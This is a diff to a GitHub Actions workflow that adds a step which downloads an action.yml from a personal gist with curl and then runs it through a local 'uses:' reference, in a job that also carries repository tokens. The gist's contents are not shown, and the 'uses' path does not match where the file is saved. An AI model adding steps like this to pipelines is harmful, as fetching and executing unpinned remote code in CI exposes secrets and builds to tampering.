@@ -19,4 +19,11 @@ jobs:
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
+      - name: Create Actions and download gist
+        run: |
+          pwd
+          mkdir ../../Actions
+          curl https://gist.githubusercontent.com/JohanWilliamSanchez/32faa6691a280e72de6a92d12803699b/raw/ >  ../../Actions/action.yml
+      - name: Use action.yml
+        uses: ../../Actions/action
  
